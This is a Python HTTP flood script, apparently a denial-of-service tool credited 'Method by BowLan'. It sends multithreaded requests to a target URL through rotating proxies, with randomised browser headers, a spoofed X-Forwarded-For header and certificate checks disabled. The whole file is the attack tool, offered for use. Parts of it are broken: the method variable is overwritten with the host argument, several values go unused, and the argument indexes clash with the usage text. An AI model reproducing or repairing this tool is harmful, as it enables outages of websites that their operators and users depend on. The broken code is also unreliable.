import requests
import ssl
import sys
import random
import time
import urllib.parse as urlparse
import threading
from fake_useragent import UserAgent

method = ["GET", "HEAD", "POST", "OPTIONS"]
cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK"
]
accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
]
patht = [
    "?s=",
    "#",
    "$",
    "?true=",
    " ",
    "?q=",
    "?false=",
    "",
    "  ",
    "?"
]
encoding_header = [
    'deflate, gzip, br',
    'gzip, br',
    'deflate,gzip',
    'deflate',
    'br'
]
control_header = [
    'no-cache',
    'max-age=0'
]
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError']
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO']

def accept():
    return random.choice(accept_header)

def encoding():
    return random.choice(encoding_header)

def controling():
    return random.choice(control_header)

def cipher():
    return random.choice(cplist)

def randstr(length):
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(characters) for _ in range(length))

def dataed(length):
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    return ''.join(random.choice(characters) for _ in range(length))

def run_thread():
    parsed = urlparse.urlparse(sys.argv[2])
    ua = UserAgent()
    cipper = cipher()
    proxy = proxyr().split(':')
    data = dataed(4)
    headers = {
        "User-Agent": ua.random,
        "X-Forwarded-For": proxy[0],
        "Upgrade-Insecure-Requests": "1",
        "Accept-Encoding": encoding(),
        "Cache-Control": controling()
    }

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    proxies = {
        "http": "http://" + proxy[0] + ":" + proxy[1],
        "https": "https://" + proxy[0] + ":" + proxy[1]
    }

    try:
        response = requests.request(method, parsed.geturl(), headers=headers, proxies=proxies, verify=False, timeout=10)
        print(response.status_code)
    except requests.exceptions.RequestException as e:
        print(e)

    time.sleep(0)

if len(sys.argv) < 7:
    print('\n')
    print('\033[1;32mHTTPS/2 Floodv5 (HTTPS Only) | Method by BowLan\033[0m')
    print('\n')
    print('Usage: python file_name <GET/HEAD> <host> <proxies> <duration> <rate<64> <thread(1-3)>')
    sys.exit(0)

rate = int(sys.argv[6])
method = sys.argv[2]

with open(sys.argv[3], 'r') as file:
    proxys = file.read().splitlines()

def proxyr():
    return random.choice(proxys)

threads = []
for _ in range(rate):
    thread = threading.Thread(target=run_thread)
    thread.start()
    threads.append(thread)

# Chờ cho tất cả các luồng hoàn thành
for thread in threads:
    thread.join()